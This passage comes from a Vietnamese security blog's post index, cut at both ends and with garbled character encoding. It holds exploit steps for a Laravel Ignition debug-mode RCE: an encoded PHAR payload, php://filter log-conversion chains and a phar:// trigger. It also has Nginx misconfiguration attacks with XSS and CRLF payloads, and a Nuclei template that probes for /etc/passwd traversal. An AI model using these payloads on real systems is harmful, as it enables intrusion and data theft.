0w=00i=00O=000=004=007=00f=00X=001=00z=00O=00j=00g=006=00I=00g=00A=00q=00A=00G=00x=00l=00d=00m=00V=00s=00I=00j=00t=00O=00O=003=00M=006=00M=00T=00Q=006=00I=00g=00A=00q=00A=00G=00l=00u=00a=00X=00R=00p=00Y=00W=00x=00p=00e=00m=00V=00k=00I=00j=00t=00i=00O=00j=00E=007=00c=00z=00o=00x=00N=00D=00o=00i=00A=00C=00o=00A=00Y=00n=00V=00m=00Z=00m=00V=00y=00T=00G=00l=00t=00a=00X=00Q=00i=00O=002=00k=006=00L=00T=00E=007=00c=00z=00o=00x=00M=00z=00o=00i=00A=00C=00o=00A=00c=00H=00J=00v=00Y=002=00V=00z=00c=002=009=00y=00c=00y=00I=007=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00c=00z=00o=003=00O=00i=00J=00j=00d=00X=00J=00y=00Z=00W=005=000=00I=00j=00t=00p=00O=00j=00E=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00f=00Q=00U=00A=00A=00A=00B=00k=00d=00W=001=00t=00e=00Q=00Q=00A=00A=00A=00A=00G=00k=00P=009=00f=00B=00A=00A=00A=00A=00A=00x=00+=00f=009=00i=00k=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00g=00A=00A=00A=00B=000=00Z=00X=00N=000=00L=00n=00R=004=00d=00A=00Q=00A=00A=00A=00A=00G=00k=00P=009=00f=00B=00A=00A=00A=00A=00A=00x=00+=00f=009=00i=00k=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00H=00R=00l=00c=003=00R=000=00Z=00X=00N=000=00C=00Q=00/=006=00k=00s=000=00G=00x=00r=00d=00l=00r=00x=00x=007=00q=00r=009=003=00V=00/=00X=00T=002=00F=00k=00C=00A=00A=00A=00A=00R=000=00J=00N=00Q=00g=00=3D=00   B∆∞·ªõc 4: Convert file log sang file PHAR 1  viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log   Ch√∫ √Ω, ·ªü b∆∞·ªõc n√†y c√≥ th·ªÉ s·ª≠ d·ª•ng utf-16le ho·∫∑c utf-16be, tu·ª≥ theo c√°c n√†o ƒë∆∞·ª£c nh√©\n M√¨nh s·ª≠ d·ª•ng c√°ch n√†y ƒë·ªÉ x√≥a log, khi m√† n√≥ ho·∫°t ƒë·ªông ch√≠nh x√°c, s·∫Ω k t√¨m th·∫•y ƒëo·∫°n base64 n√†o c·∫£ n√™n output tr·∫£ v·ªÅ l√† kh√¥ng c√≥ g√¨, th√†nh ra x√≥a ƒë∆∞·ª£c log. G·ª≠i request 1 l·∫ßn k ƒë∆∞·ª£c th√¨ th·ª≠ v√†i l·∫ßn xem sao nh√©.\n B∆∞·ªõc 5: Ch·∫°y PHAR deserialization 1  viewFile: phar:///path/to/storage/logs/laravel.log   V√† ta ƒë∆∞·ª£c th√†nh qu·∫£\nExploit PoC N·∫øu ai mu·ªën th·ª≠ nghi·ªám th√¨ ƒë·ª£i m√¨nh build xong Docker r·ªìi ch·∫°y nh√©, t·∫°m th·ªùi d√πng t·∫°m c√°i n√†y ƒë√£ nha\n1 2 3 4 5 6  $ git clone https://github.com/laravel/laravel.git $ cd laravel $ git checkout e849812 $ composer install $ composer require facade/ignition==2.5.1 $ php artisan serve   Ch√∫ng m√¨nh c√≥ vi·∫øt xong PoC exploit ·ªü ƒë√¢y, hi v·ªçng c√≥ √≠ch cho m·ªçi ng∆∞·ªùi ;)\nGithub: https://github.com/khanhnv-2091/laravel-8.4.2-rce\nC·∫£m ∆°n anh @vigov5 v√† @com0tf3 ƒë√£ h·ªó tr·ª£ nghi√™n c·ª©u CVE n√†y.\nTham kh·∫£o  https://www.ambionics.io/blog/laravel-debug-rce   B√†i ch∆∞a h·∫øt ·ªü ƒë√¢y nh·ªõ, c√≤n ph·∫ßn 2 :D\n ","permalink":"https://minhtuanact.ml/posts/laravel-v842-debug-mode-remote-code-execution-chiem-quyen-dieu-khien-may-thang-ban-dang-code-php/","summary":"T·∫£n m·∫°n \u0026ldquo;H·∫±ng nƒÉm c·ª© v√†o cu·ªëi ƒë√¥ng, l√° ngo√†i ƒë∆∞·ªùng r·ª•ng nhi·ªÅu v√† tr√™n kh√¥ng c√≥ nh·ªØng ƒë√°m m√¢y b√†ng b·∫°c, l√≤ng t√¥i l·∫°i nao n·ª©c nh·ªØng k·ª∑ ni·ªám hoang mang.\nT√¥i kh√¥ng th·ªÉ n√†o qu√™n ƒë∆∞·ª£c nh·ªØng c·∫£m gi√°c trong s√°ng ·∫•y n·∫£y n·ªü trong l√≤ng t√¥i nh∆∞ m·∫•y c√†nh hoa t∆∞∆°i m·ªâm c∆∞·ªùi gi·ªØa b·∫ßu tr·ªùi quang ƒë√£ng.\nNh·ªØng √Ω t∆∞·ªüng ·∫•y t√¥i ch∆∞a l·∫ßn n√†o ghi l√™n gi·∫•y, v√¨ h·ªìi ·∫•y t√¥i kh√¥ng bi·∫øt ghi v√† ng√†y nay t√¥i kh√¥ng nh·ªõ h·∫øt.","title":"Laravel \u003c= v8.4.2 debug mode: Remote code execution - Chi·∫øm quy·ªÅn ƒëi·ªÅu khi·ªÉn m√°y th·∫±ng b·∫°n ƒëang code PHP"},{"content":"Intro Nginx ƒë∆∞·ª£c s·ª≠ d·ª•ng l√†m web server, reverse proxy m·∫°nh m·∫Ω, nginx ƒë∆∞·ª£c c√†i ƒë·∫∑t cho kho·∫£ng 1/3 s·ªë web site tr√™n th·∫ø gi·ªõi n√†y. Trong b√†i vi·∫øt n√†y s·∫Ω l√† m·ªôt s·ªë c·∫•u h√¨nh sai Nginx ph·ªï bi·∫øn m√† v·ªõi c√°c c·∫•u h√¨nh nh∆∞ v·∫≠y, web server c·ªßa b·∫°n s·∫Ω d·ªÖ d√†ng b·ªã t·∫•n c√¥ng\n B√†i vi·∫øt n√†y ƒë∆∞·ª£c tham kh·∫£o blog c·ªßa Detectify Crowdsource t·∫°i https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/\n Nginx l√† m·ªôt trong nh·ªØng web server ƒë∆∞·ª£c s·ª≠ d·ª•ng ph·ªï bi·∫øn nh·∫•t tr√™n Internet do d·ªÖ d√†ng c√†i ƒë·∫∑t, dung l∆∞·ª£ng nh·∫π, t√≠ch h·ª£p nhi·ªÅu module v√† s·ª≠ d·ª•ng file c·∫•u h√¨nh ƒë∆°n gi·∫£n, th√¢n thi·ªán v·ªõi ng∆∞·ªùi d√πng. Detectify ƒë√£ ph√¢n t√≠ch gi√∫p ch√∫ng ta v·ªõi g·∫ßn 50.000 file config Nginx ƒë∆∞·ª£c public tr√™n Github, v√† ch·ªâ ra ƒë∆∞·ª£c 4 l·ªói c∆° b·∫£n ng∆∞·ªùi d√πng m·∫Øc ph·∫£i khi c·∫•u h√¨nh v·ªõi Nginx nh∆∞ sau:\n Missing root location Unsafe variable use Raw backend response reading merge_slashes set to off  Nginx Misconfigure Missing root location 1 2 3 4 5 6 7 8  server { root /etc/nginx; #root location  location /hello.txt { try_files $uri $uri/ =404; proxy_pass http://127.0.0.1:8080/; } }   Root location ch·ªâ ƒë·ªãnh th∆∞ m·ª•c g·ªëc cho Nginx. Trong v√≠ d·ª• tr√™n, th∆∞ m·ª•c g·ªëc /etc/nginx c√≥ nghƒ©a l√† ch√∫ng ta c√≥ th·ªÉ truy c·∫≠p c√°c t·ªáp trong th∆∞ m·ª•c ƒë√≥. C·∫•u h√¨nh tr√™n kh√¥ng c·∫•u h√¨nh cho root location / location / {...}) m√† ch·ªâ c√≥ c·∫•u h√¨nh cho /hello.txt. Do ƒë√≥, root directory s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü to√†n c·ª•c t·∫°i /etc/nginx. V√¨ v·∫≠y, c√°c request t·ªõi / s·∫Ω ƒë∆∞a b·∫°n ƒë·∫øn v·ªõi ƒë∆∞·ªùng d·∫´n c·ª•c b·ªô /etc/nginx, l√∫c n√†y ch√∫ng ta c√≥ th·ªÉ t·∫£i xu·ªëng ƒë∆∞·ª£c file nginx.conf v√† ti·∫øt l·ªô n·ªôi dung file nginx.conf.\nNh∆∞ v·∫≠y, n·∫øu n·∫Øm ƒë∆∞·ª£c c·∫•u tr√∫c th∆∞ m·ª•c /etc/nginx th√¨ ta c√≥ th·ªÉ xem v√† ti·∫øt l·ªô ƒë∆∞·ª£c to√†n b·ªô c√°c file trong th∆∞ m·ª•c n√†y. V·∫≠y th√¨ nguy hi·ªÉm ƒë·∫øn nh∆∞ th·∫ø n√†o n·∫øu root location l√†\n1  root /;   Hacker c√≥ th·ªÉ t√¨m ra ƒë∆∞·ª£c c√°c file quan tr·ªçng v√† t·∫£i xu·ªëng v·ªõi m·ª•c ƒë√≠ch x·∫•u. V√≠ d·ª• nh∆∞ c√°c file config kh√°c, file logs, hay ch·ªâ ƒë·ªÉ l·∫•y basic authen =))\nTrong s·ªë g·∫ßn 50.000 file Nginx config m√† Detectify ƒë√£ thu th·∫≠p, c√°c root path ph·ªï bi·∫øn nh·∫•t l√†: Off-By-Slash 1 2 3 4 5 6 7 8 9 10 11 12 13  server { listen 80 default_server; server_name _; location /static { alias /usr/share/nginx/static/; } location /api { proxy_pass http://apiserver/v1/; } }   V·ªõi c·∫•u h√¨nh sai Off-By-Slash, ch√∫ng ta c√≥ th·ªÉ ƒëi qua m·ªôt b∆∞·ªõc tr√™n ƒë∆∞·ªùng d·∫´n do thi·∫øu d·∫•u g·∫°ch ch√©o. Orange Tsai ƒë√£ l√†m cho k·ªπ thu·∫≠t n√†y tr·ªü n√™n n·ªïi ti·∫øng v·ªõi b√†i talk tr√™n Blackhat c·ªßa anh ·∫•y Breaking Parser Logic. Anh ·∫•y ƒë√£ ch·ªâ ra c√°ch ƒë·ªçc ƒë∆∞·ª£c source code trong server web n·∫øu c·∫•u h√¨nh Nginx b·ªã thi·∫øu m·ªôt d·∫•u g·∫°ch ch√©o / trong location k·∫øt h·ª£p v·ªõi directives alias. ƒêi·ªÅu n√†y c≈©ng ho·∫°t ƒë·ªông v·ªõi c√°c directives kh√°c nh∆∞ proxy_pass. C√πng t√¨m hi·ªÉu nh·ªØng g√¨ dang x·∫£y ra v√† t·∫°i sao n√≥ l·∫°i ho·∫°t ƒë·ªông ƒë∆∞·ª£c.\n1 2 3  location /api { proxy_pass http://apiserver/v1/; }   V·ªõi Nginx server ƒëang ch·∫°y v·ªõi c·∫•u h√¨nh tr√™n c√≥ th·ªÉ truy c·∫≠p ƒë∆∞·ª£c server, c√≥ th·ªÉ gi·∫£ s·ª≠ r·∫±ng ch·ªâ c√≥ http://apiserver/v1/ m·ªõi c√≥ quy·ªÅn truy c·∫≠p.\n1  http://server/api/user -\u0026gt; http://apiserver/v1//user   Khi http://server/api/user ƒë∆∞·ª£c y√™u c·∫ßu, Nginx s·∫Ω chu·∫©n h√≥a URL. Sau ƒë√≥, n√≥ s·∫Ω xem li·ªáu /api c√≥ kh·ªõp v·ªõi URL hay kh√¥ng. Ti·∫øp t·ª•c, ti·ªÅn t·ªë s·∫Ω b·ªã x√≥a kh·ªèi URL ƒë·ªÉ c√≤n l·∫°i ƒë∆∞·ªùng d·∫´n /user. Sau ƒë√≥, ƒë∆∞·ªùng d·∫´n ƒë∆∞·ª£c th√™m v√†o URL proxy_pass d·∫´n ƒë·∫øn URL cu·ªëi c√πng l√† http://apiserver/v1//user.\nL∆∞u √Ω r·∫±ng c√≥ d·∫•u g·∫°ch ch√©o k√©p b√™n trong URL v√¨ v·ªã tr√≠ directive kh√¥ng k·∫øt th√∫c b·∫±ng d·∫•u g·∫°ch ch√©o, v√† proxy_pass URL s·∫Ω ƒë∆∞·ª£c k·∫øt th√∫c b·∫±ng m·ªôt d·∫•u g·∫°ch ch√©o. H·∫ßu h·∫øt c√°c web server s·∫Ω chu·∫©n h√≥a http://apiserver/v1//user th√†nh http://apiserver/v1/user, c√≥ nghƒ©a l√† ngay c·∫£ v·ªõi vi·ªác c·∫•u h√¨nh sai nh∆∞ th·∫ø n√†y, m·ªçi th·ª© v·∫´n s·∫Ω ho·∫°t ƒë·ªông m∆∞·ª£t m√† v√† c√≥ th·ªÉ s·∫Ω kh√¥ng ƒë∆∞·ª£c ch√∫ √Ω t·ªõi.\nTuy nhi√™n v·ªõi c·∫•u h√¨nh Nginx nh∆∞ tr√™n, attacker c√≥ th·ªÉ khai th√°c web server b·∫±ng c√°ch g·ª≠i request http://server/api../ ƒëi·ªÅu n√†y s·∫Ω d·∫´n ƒë·∫øn vi·ªác Nginx s·∫Ω g·ª≠i y√™u c·∫ßu t·ªõi URL http://apiserver/v1/../ v√† n√≥ s·∫Ω chuy·ªÉn th√†nh http://apiserver/. C√°ch khai th√°c n√†y c√≥ th·ªÉ g√¢y ra impact kh√°c nhau, t√πy theo m·ª©c ƒë·ªô nguy hi·ªÉm c·ªßa n√≥, v√≠ d·ª• b·∫°n c√≥ th·ªÉ truy c·∫≠p v√†o m·ªôt file test.php ƒë∆∞·ª£c ƒë·∫∑t t·∫°i http://apiserver/test.php m√† ƒë√°ng l·∫Ω ra b·∫°n kh√¥ng th·ªÉ truy c·∫≠p ƒë·∫øn ƒë√≥ ƒë∆∞·ª£c (nh·ªõ r·∫±ng server http://apiserver/ ch·ªâ ƒë∆∞·ª£c truy c·∫≠p th√¥ng qua http://server th√¥ng qua proxy_pass).\nUnsafe variable use M·ªôt s·ªë frameworks, scripts v√† c·∫•u h√¨nh Nginx kh√¥ng an to√†n s·ª≠ d·ª•ng c√°c bi·∫øn do Nginx l∆∞u tr·ªØ. ƒêi·ªÅu n√†y c√≥ th·ªÉ khai th√°c d·∫´n ƒë·∫øn XSS, bypass HttpOnly, hay th·∫≠m ch√≠ c·∫£ RCE.\nSCRIPT_NAME V·ªõi c·∫•u h√¨nh nh∆∞ sau:\n1 2 3 4 5  location ~ \\.php$ { include fastcgi_params; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; fastcgi_pass 127.0.0.1:9000; }   V·∫•n ƒë·ªÅ ·ªü ƒë√¢y l√† Nginx s·∫Ω g·ª≠i b·∫•t k·ª≥ URL n√†o ƒë·∫øn PHP interpreter khi k·∫øt th√∫c b·∫±ng .php ngay c·∫£ khi t·ªáp kh√¥ng t·ªìn t·∫°i tr√™n ·ªï c·ª©ng. ƒê√¢y l√† m·ªôt l·ªói ph·ªï bi·∫øn trong nhi·ªÅu file c·∫•u h√¨nh Nginx.\nV·∫≠y impact khi c·∫•u h√¨nh sai Nginx n√†y nh∆∞ th·∫ø n√†o:\n XSS: XSS s·∫Ω x·∫£y ra n·∫øu ƒëo·∫°n code PHP x√°c ƒë·ªãnh m·ªôt base URL d·ª±a tr√™n SCRIPT_NAME 1 2 3 4 5 6 7 8 9 10  \u0026lt;?php if(basename($_SERVER[\u0026#39;SCRIPT_NAME\u0026#39;]) == basename($_SERVER[\u0026#39;SCRIPT_FILENAME\u0026#39;])) echo dirname($_SERVER[\u0026#39;SCRIPT_NAME\u0026#39;]); ?\u0026gt;GET /index.php/\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;/index.php SCRIPT_NAME = /index.php/\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;/index.php     Usage of $uri can lead to CRLF Injection M·ªôt c·∫•u h√¨nh sai kh√°c li√™n quan ƒë·∫øn c√°c bi·∫øn Nginx l√† s·ª≠ d·ª•ng $uri ho·∫∑c $document_uri thay v√¨ $request_uri. $uri v√† $document_uri ch·ª©a URI chu·∫©n h√≥a trong khi qu√° tr√¨nh chu·∫©n h√≥a trong Nginx bao g·ªìm gi·∫£i m√£ URL cho URI. $uri th∆∞·ªùng ƒë∆∞·ª£c s·ª≠ d·ª•ng khi t·∫°o chuy·ªÉn h∆∞·ªõng location trong c·∫•u h√¨nh Nginx d·∫´n ƒë·∫øn b·ªã CRLF Injection.\nV√≠ d·ª• v·ªÅ m·ªôt tr∆∞·ªùng h·ª£p config Nginx d·∫´n ƒë·∫øn l·ªó h·ªïng n√†y:\n1 2 3  location / { return 302 https://example.com$uri; }   K√Ω t·ª± t·∫°o d√≤ng m·ªõi trong HTTP l√† \\r (Carriage Return) v√† \\n (Line Feed)\n2 k√Ω t·ª± n√†y c√≥ th·ªÉ ƒë∆∞·ª£c URL-encoding th√†nh k√Ω t·ª± %0d%0a. Khi nh·ªØng k√Ω t·ª± n√†y ƒë∆∞·ª£c truy·ªÅn v√†o m·ªôt request nh∆∞ http://localhost/%0d%0aDetectify:%20clrf v√† ch√∫ng ta ki·ªÉm tra response tr·∫£ v·ªÅ v·ªõi config Nginx tr√™n nh∆∞ th·∫ø n√†o:\nNh∆∞ h√¨nh tr√™n ch√∫ng ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c r·∫±ng Response tr·∫£ v·ªÅ c√≥ th√™m m·ªôt Header n·ªØa l√† Detectify: clrf, c√≥ r·∫•t nhi·ªÅu c√°ch t·∫•n c√¥ng ƒë·ªëi v·ªõi l·ªói CRLF Injection n√†y, do tr√¨nh duy·ªát tin t∆∞·ªüng ho√†n to√†n v√†o response tr·∫£ v·ªÅ t·ª´ server, b·∫°n ƒë·ªçc c√≥ th·ªÉ ƒë·ªçc th√™m t·∫•n c√¥ng t·∫°i https://blog.detectify.com/2019/06/14/http-response-splitting-exploitations-and-mitigations/\nEnd to part 1 Vi·∫øt ƒë·∫øn ƒë√¢y m√† m√¨nh h·∫øt m·∫•t 2 tu·∫ßn r·ªìi, c·ª© c√≥ th·ªùi gian m·ªõi v√†o d·ªãch v√† t·∫°o poc, hi v·ªçng l√† m·ªçi ng∆∞·ªùi s·∫Ω ch·ªù ƒë·∫øn ph·∫ßn 2 khi m√¨nh c√≥ h·ª©ng ti·∫øp nha, c·∫£m ∆°n t·∫•t c·∫£ m·ªçi ng∆∞·ªùi ƒë√£ ƒë·ªçc :D\n","permalink":"https://minhtuanact.ml/posts/cac-cau-hinh-sai-nginx-pho-bien-khien-web-server-cua-ban-gap-nguy-hiem-part-1/","summary":"Intro Nginx ƒë∆∞·ª£c s·ª≠ d·ª•ng l√†m web server, reverse proxy m·∫°nh m·∫Ω, nginx ƒë∆∞·ª£c c√†i ƒë·∫∑t cho kho·∫£ng 1/3 s·ªë web site tr√™n th·∫ø gi·ªõi n√†y. Trong b√†i vi·∫øt n√†y s·∫Ω l√† m·ªôt s·ªë c·∫•u h√¨nh sai Nginx ph·ªï bi·∫øn m√† v·ªõi c√°c c·∫•u h√¨nh nh∆∞ v·∫≠y, web server c·ªßa b·∫°n s·∫Ω d·ªÖ d√†ng b·ªã t·∫•n c√¥ng\n B√†i vi·∫øt n√†y ƒë∆∞·ª£c tham kh·∫£o blog c·ªßa Detectify Crowdsource t·∫°i https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/","title":"C√°c c·∫•u h√¨nh sai Nginx ph·ªï bi·∫øn khi·∫øn web server c·ªßa b·∫°n g·∫∑p nguy hi·ªÉm (Part 1)"},{"content":"Intro D·∫°o g·∫ßn ƒë√¢y m√¨nh hay s·ª≠ d·ª•ng c√°c tool t·ª± ƒë·ªông recon khai th√°c c√°c l·ªói, ph·∫ßn v√¨ ƒë·ªÉ ƒë∆°n gi·∫£n ho√°, ph·∫ßn v√¨ m√¨nh ƒë·ª° b·ªè qua c√°c l·ªói c∆° b·∫£n kh√¥ng ƒë√°ng c√≥, nh·∫•t l√† v·ªõi l∆∞·ª£ng sub-domain kh√° l·ªõn, hay scope r·ªông c·ªßa c√°c program.\nTrong kho·∫£ng th·ªùi gian t√¨m ki·∫øm tools t·ª± ƒë·ªông c√≥ th·ªÉ ƒë∆°n gi·∫£n ho√° vi·ªác recon website th√¨ ng∆∞·ªùi anh ng·ªìi c·∫°nh m√¨nh suggest cho m√¨nh m·ªôt tool kh√° hay. Nuclei\nV·∫≠y t·∫°i sao m√¨nh l·∫°i vi·∫øt b√†i n√†y, m√¨nh th·∫•y Nuclei kh√° hay, c√≥ nhi·ªÅu module, c√≥ th·ªÉ custom rules tho·∫£i m√°i, \u0026hellip;\nM·ªôt s·ªë th√¥ng tin v·ªÅ Nuclei:\n Github: https://github.com/projectdiscovery/nuclei Home page: https://nuclei.projectdiscovery.io/ Blog: https://blog.projectdiscovery.io/  C√†i ƒë·∫∑t Nuclei Vi·ªác c√†i ƒë·∫∑t v√¥ c√πng ƒë∆°n gi·∫£n v√† kh√¥ng h·ªÅ ph·ª©c t·∫°p, c√≥ h·∫≥n 3 c√°ch ƒë·ªÉ c√†i ƒë·∫∑t Nuclei l√™n VPS c·ªßa b·∫°n (·ªü ƒë√¢y m√¨nh s·ª≠ d·ª•ng VPS v·ª´a ƒë·ª° t·ªën ƒëi·ªán v·ª´a ti·ªán ch·∫°y recon tr√™n ƒë√≥ ƒë·ª° ·∫£nh h∆∞·ªüng ph·∫ßn c·ª©ng m√°y th·∫≠t):\nC√°ch 1: C√†i ƒë·∫∑t s·ª≠ d·ª•ng binary 1 2 3 4 5  T·∫£i binary m·ªõi nh·∫•t t·∫°i https://github.com/projectdiscovery/nuclei/releases ‚ñ∂ tar -xzvf nuclei-linux-amd64.tar.gz #Gi·∫£i n√©n ‚ñ∂ mv nuclei /usr/local/bin/ #Di chuy·ªÉn file binary v√†o path ƒë·ªÉ g·ªçi ·ªü b·∫•t c·ª© ƒë√¢u ‚ñ∂ nuclei -version #Ki·ªÉm tra ƒë√£ c√†i ƒë·∫∑t xong ch∆∞a   C√°ch 2: C√†i ƒë·∫∑t l·∫•y tr·ª±c ti·∫øp t·ª´ source Nuclei y√™u c·∫ßu c√†i ƒë·∫∑t go1.14 tr·ªü l√™n, sau khi c√°c b·∫°n c√†i go1.14+ th√¨ ch·∫°y 1 command n√†y l√† c√≥ th·ªÉ s·ª≠ d·ª•ng nuclei r·ªìi\n1  ‚ñ∂ GO111MODULE=on go get -u -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei   C√°ch 3: C√†i ƒë·∫∑t v·∫´n l√† t·ª´ source, nh∆∞ng b·∫±ng c√°ch kh√°c :kissing_heart: 1  ‚ñ∂ git clone https://github.com/projectdiscovery/nuclei.git; cd nuclei/v2/cmd/nuclei/; go build; mv nuclei /usr/local/bin/; nuclei -version   C√†i ƒë·∫∑t xong r·ªìi, tuy nhi√™n ch√∫ng ta ch∆∞a s·ª≠ d·ª•ng nuclei ƒë∆∞·ª£c ngay ƒë√¢u, nuclei ch·∫°y ƒë∆∞·ª£c khi s·ª≠ d·ª•ng rules, tuy nhi√™n nuclei c√≥ h·ªó tr·ª£ c√°c templates c√≥ s·∫µn t·∫£i v·ªÅ b·∫±ng c√°ch\n1  nuclei -update-templates   ho·∫∑c c√≥ th·ªÉ download t·ª´ Github\n1  git clone https://github.com/projectdiscovery/nuclei-templates.git   Kh·ªüi ch·∫°y Nuclei C√≥ kh√° nhi·ªÅu c√°ch s·ª≠ d·ª•ng Nuclei, c√°c b·∫°n c√≥ th·ªÉ t√¨m hi·ªÉu th√¥ng qua --help nh√©, ·ªü ƒë√¢y m√¨nh h∆∞·ªõng d·∫´n s·ª≠ d·ª•ng c∆° b·∫£n th√¥i ^^;\nCh·∫°y Nuclei v·ªõi 1 template V√≠ d·ª• ch√∫ng ta c√≥ 1 list domain, ch√∫ng ta c·∫ßn ki·ªÉm tra xem trong list domain n√†y c√≥ c·∫•u h√¨nh l·ªói th∆∞ m·ª•c .git hay kh√¥ng, ch·∫°y l·ªánh\n1  nuclei -l urls.txt -t files/git-core.yaml -o results.txt   v·ªõi\n urls.txt t·ªïng h·ª£p list domain c·∫ßn test files/git-core.yaml l√† file template ki·ªÉm tra results.txt l√† file xu·∫•t ra k·∫øt qu·∫£ sau n√†y ki·ªÉm tra l·∫°i.  Ch·∫°y Nuclei v·ªõi to√†n b·ªô templates ƒê√¢y l√† c√°ch m√¨nh hay s·ª≠ d·ª•ng, ch·∫°y to√†n b·ªô lu√¥n, th√† gi·∫øt nh·∫ßm c√≤n h∆°n b·ªè s√≥t, ch·∫°y to√†n b·ªô h√¨nh nh∆∞ l√† kho·∫£ng 350 c√°i template th√¨ ph·∫£i, c≈©ng hay ƒë∆∞·ª£c update template, b·∫°n c√≥ th·ªÉ ƒë·ªçc log tr√™n trang ch·ªß.\n1  nuclei -l urls.txt -t nuclei-template/ -o results.txt   Ch·∫°y Nuclei v·ªõi t√≠nh nƒÉng lo·∫°i tr·ª´ template Ch·∫°y template d·ª±a theo m·ª©c ƒë·ªô nghi√™m tr·ªçng 1  nuclei -l urls.txt -t nuclei-template/ -severity critical, medium   V·ªõi c√¢u l·ªánh n√†y nuclei s·∫Ω ch·ªâ ch·∫°y nh·ªØng template ƒë∆∞·ª£c ƒë√°nh d·∫•u m·ª©c ƒë·ªô nguy hi·ªÉm l√† critical v√† medium m√† th√¥i.\nCh·∫°y to√†n b·ªô template nh∆∞ng lo·∫°i tr·ª´ m·ªôt v√†i th∆∞ m·ª•c 1  nuclei -l urls.txt -t nuclei-templates -exclude panels/ -exclude files/wp-xmlrpc.yaml   C√≤n r·∫•t nhi·ªÅu t√≠nh nƒÉng c·ªßa nuclei ƒëang ch·ªù b·∫°n kh√°m ph√° nh√© ;)\nVi·∫øt template cho Nuclei ·ªû ƒë√¢y ch√∫ng ta s·ª≠ d·ª•ng 1 template c√≥ s·∫µn c·ªßa Nuclei t√¨m ki·∫øm c√°c l·ªói directory traversal\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  id:directory-traversalinfo:name:Generic Directory Traversalauthor:pentest_swisskyseverity:highdescription:Detect basic directory traversal leading to a leak of sensitive files.requests:- method:GETpath:- \u0026#34;{{BaseURL}}/..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/..%5c..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/..%5c..%5c..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/..%5c..%5c..%5c..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/..%5c..%5c..%5c..%5c..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/static/..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/static/..%5c..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/static/..%5c..%5c..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/static/..%5c..%5c..%5c..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd\u0026#34;- \u0026#34;{{BaseURL}}/./../../../../../../../../../../etc/passwd\u0026#34;matchers-condition:andmatchers:- type:statusstatus:- 200- type:regexregex:- \u0026#34;root:[x*]:0:0:\u0026#34;part:body  ·ªû ƒë√¢y ch√∫ng ta c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c, template n√†y ƒë∆∞·ª£c chia ra l√†m 3 ph·∫ßn\n Ph·∫ßn 1: ch·ªâ r√µ t√™n id c·ªßa template n√†y directory-traversal Ph·∫ßn 2: ·ªû ƒë√¢y vi·∫øt to√†n b·ªô th√¥ng tin li√™n quan ƒë·∫øn l·ªó h·ªïng n√†y, t√™n l√† g√¨, ng∆∞·ªùi vi·∫øt l√† ai, m·ª©c ƒë·ªô nguy hi·ªÉm ra sao, m√¥ t·∫£ l·ªó h·ªïng th·∫ø n√†o Ph·∫ßn 3: Ph·∫ßn n√†y l√† ph·∫ßn quan tr·ªçng nh·∫•t, n√≥ s·∫Ω ch·ªâ cho Nuclei ch·∫°y c√°c request nh∆∞ th·∫ø n√†o, khi tr·∫£ v·ªÅ k·∫øt qu·∫£ nh∆∞ th·∫ø n√†o th√¨ x√°c ƒë·ªãnh ƒë∆∞·ª£c ƒë·∫•y ƒë√∫ng l√† l·ªói, \u0026hellip;  To√†n b·ªô h∆∞·ªõng d·∫´n vi·∫øt template c·ªßa nuclei c√≥ t·∫°i https://nuclei.projectdiscovery.io/templating-guide/, hi v·ªçng c√°c b·∫°n vi·∫øt ƒë∆∞·ª£c c√°c template th·∫≠t hay ƒë·ªÉ contribute cho nuclei nh√© ;)\nK·∫øt qu·∫£ M·ªôt s·ªë l·ªó h·ªïng m√¨nh ƒë√£ t√¨m ƒë∆∞·ª£c khi s·ª≠ d·ª•ng Nuclei Command m√¨nh hay s·ª≠ d·ª•ng l√†\n1  A=\u0026lt;domain\u0026gt;;subfinder -d $A | httprobe | tee ~/sub-domain/$A | nuclei -t nuclei-templates/ -o ~/project-pentest/$A-output.txt   Tham kh·∫£o  https://blog.projectdiscovery.io/post/nuclei-fuzz-all-the-things/ https://nuclei.projectdiscovery.io/templating-guide/ https://medium.com/@vedanttekale20/how-recon-helped-me-to-find-an-interesting-bug-17a2d8cf1778 https://github.com/projectdiscovery/nuclei  ","permalink":"https://minhtuanact.ml/posts/hay-de-viec-fuzzing-don-gian-hon-voi-nuclei/","summary":"Intro D·∫°o g·∫ßn ƒë√¢y m√¨nh hay s·ª≠ d·ª•ng c√°c tool t·ª± ƒë·ªông recon khai th√°c c√°c l·ªói, ph·∫ßn v√¨ ƒë·ªÉ ƒë∆°n gi·∫£n ho√°, ph·∫ßn 